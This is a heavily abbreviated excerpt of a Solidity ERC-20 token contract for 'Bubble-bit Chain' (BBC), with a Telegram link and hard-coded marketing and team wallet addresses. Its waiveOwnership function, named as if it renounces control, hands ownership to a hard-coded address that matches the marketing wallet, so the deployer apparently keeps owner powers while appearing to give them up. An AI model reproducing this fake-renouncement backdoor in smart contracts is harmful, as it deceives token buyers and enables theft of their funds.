...
//Telegram https://t.me/bubblebitchain
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xdD371Ab2dfe450d66cf2B676c1dd848c530a9DCD);
    }
...
contract BUBBLEBITCHAIN is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Bubble-bit Chain";
    string private _symbol = "BBC";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xdD371Ab2dfe450d66cf2B676c1dd848c530a9DCD);
    address payable public teamWalletAddress = payable(0xB659C2dE946214DbD37af9256c878f617ce5ADaa);
